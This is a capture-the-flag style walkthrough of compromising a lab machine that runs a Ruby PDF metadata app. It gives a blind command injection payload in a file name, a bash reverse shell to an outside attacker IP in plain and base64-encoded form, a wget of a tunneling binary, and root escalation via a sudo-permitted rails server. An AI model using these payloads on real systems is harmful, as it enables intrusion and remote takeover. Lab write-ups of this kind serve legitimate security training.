## **Port Scanning**

`nmap -sV -sC -p- -v $IP --open`

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 12:68:ac:62:e8:c0:bf:55:25:85:06:96:4b:99:bb:4a (ECDSA)
|_  256 65:dc:ed:09:75:7b:d2:d9:a0:19:e5:1c:e7:1d:14:53 (ED25519)
3000/tcp open  ppp?

```

Only ports 22 (SSH) and 3000 (HTTP) are open.

## Enumeration

`http://172.16.4.120:3000`

This is an application called &&PDFInfo&&, capable of reading PDF metadata.

![injection](/static/images/injection-writeup-images/image.png)

When uploading a PDF, we can see that the application is developed in Ruby:

![injection 1](/static/images/injection-writeup-images/image1.png)

By searching for pdfinfo ruby exploit, we find associated CVEs.

![injection 2](/static/images/injection-writeup-images/image2.png)

In this specific case, we have a **Command Injection** vulnerability.

I tested the `id` command but got no success, indicating a **Blind Command Injection**.

Using the `sleep 5` command, we observe a delay in the response.

`;$(sleep 5).pdf`

## Foot Hold

Passing the reverse shell in the traditional way does not work, so the alternative was to encode the payload in base64 before sending.

`echo "bash -c 'exec bash -i &>/dev/tcp/10.0.31.150/1234 <&1'" | base64`

`echo -n YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMC4zMS4xNTAvMTMzNyA8JjEnCg== |base64 -d|sh`

## Privillege Escalation

We can execute the command `/usr/local/bin/rails server -e development -p 8000` as root.

`sudo -l`

![injection 5](/static/images/injection-writeup-images/image5.png)

`rm /home/deployer/pdf-read-metadata/tmp/pids/server.pid`

`sudo /usr/local/bin/rails server -e development -p 8000`

![injection 6](/static/images/injection-writeup-images/image6.png)

Now that we can start the application as root, we need to perform Port Forwarding to access the application from our machine.

The server has an accessible SSH service, but this time I used the **chisel** tool.

[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)

To perform Port Forwarding, we need to transfer **chisel** to the target machine.

`python -m http.server 80`

![injection 7](/static/images/injection-writeup-images/image7.png)

`wget http://10.0.31.150/chisel`

![injection 8](/static/images/injection-writeup-images/image8.png)

After that, on our machine, we start the chisel server.

`./chisel server -p 9000 --reverse`

![injection 9](/static/images/injection-writeup-images/image9.png)

Now on the target machine, we perform **Port Forwarding**.

Note: I used two shells to execute this successfully.

`sudo /usr/local/bin/rails server -e development -p 8000` # in the **/pdf-read-metadata directory**

`./chisel client 10.0.31.150:9000 R:8000:127.0.0.1:8000` # in the **/tmp directory**

![injection 10](/static/images/injection-writeup-images/image10.png)

Now we can access the application from our machine.

![injection 11](/static/images/injection-writeup-images/image11.png)

Now, we just need to get the reverse shell the same way as before, but this time as root.
